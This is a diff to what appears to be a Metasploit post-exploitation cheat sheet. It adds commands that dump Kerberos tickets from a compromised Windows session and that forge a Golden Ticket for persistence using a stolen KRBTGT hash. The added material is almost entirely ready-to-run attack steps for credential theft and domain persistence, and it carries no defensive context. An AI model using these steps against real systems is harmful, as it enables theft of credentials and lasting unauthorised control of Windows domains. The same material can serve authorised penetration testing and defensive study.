@@ -58,3 +58,25 @@ Execution
 
     set session NUM
     run
+
+### 2) Kerberos Tickets
+
+    use post/windows/manage/kerberos_tickets
+
+Execution
+
+    set session NUM
+    set action DUMP_TICKETS
+    run
+
+## Persistence
+
+### 1) Golden Ticket
+
+    use post/windows/escalate/golden_ticket
+
+Execution
+
+    set session NUM
+    set KRBTGT_HASH LM_HAHS:NTLM_HASH
+    run
